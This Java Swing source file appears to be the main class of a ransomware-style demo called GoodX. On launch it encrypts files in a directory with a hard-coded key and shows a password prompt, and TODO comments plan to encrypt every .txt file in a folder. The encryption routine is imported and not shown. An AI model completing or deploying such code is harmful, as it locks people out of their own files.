package com.goodx;

import com.security.FileEncryption;
import com.security.FileEncryptionException;

import javax.crypto.Cipher;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FilenameFilter;

import static com.security.FileEncryption.getPassword;

/**
 * @Author Mustafa Jamal
 * @GitHub @doct0rX
 */
public class GoodX {
    private static FileEncryption fileEncryption;
    private JButton submitButton;
    private JPanel goodMain;
    private JPasswordField passwordField;
    private JButton about️Button;
    private JTextArea enterTheKeyToTextArea;

    private GoodX() {
        submitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent event) {
                String cmd = event.getActionCommand();
                char[] passwordInput = passwordField.getPassword();
                if (isPasswordCorrent(passwordInput)) {
                    JOptionPane.showMessageDialog(null, "Correct Password!!!\n---------------\n|    " + new String(passwordInput) + "    |\n---------------");
                } else {
                    JOptionPane.showMessageDialog(null, "nope.");
                }
            }
        });
    }

    /**
     * check if the password is correct or not
     * @param passwordInput array of char
     * @return boolean
     */
    private boolean isPasswordCorrent(char[] passwordInput) {
        return new String(passwordInput).equals(getPassword());
    }

    // TODO: if needed to add dir; loop over the constractor for each file in the dir;
    // TODO: extract every file from the dir and use it as instance to encrypt the files in the given directory.
    // TODO: STILL NOT USED... FOR SAFETY PROPUSES.
    /**
     * For directories.
     * @param dirName directory path
     * @return returne the name of every file in the specified directory
     */
    public File[] finder(String dirName) {
        File dir = new File(dirName);
        return dir.listFiles(new FilenameFilter() {
            public boolean accept(File dir, String filename)
            { return filename.endsWith(".txt"); }
        } );
    }


    public static void main(String[] args) throws FileEncryptionException {
        JFrame frame = new JFrame("GoodX");
        frame.setContentPane(new GoodX().goodMain);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setSize(501, 201);
        Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();  // setting the frame in the center of screen.
        frame.setLocation(dimension.width/2-frame.getSize().width/2, dimension.height/2-frame.getSize().height/2);
        frame.setVisible(true);
        fileEncryption = new FileEncryption(FileEncryption.getDirPath(),"123", (byte) Cipher.ENCRYPT_MODE);
        fileEncryption.start();
    }
}
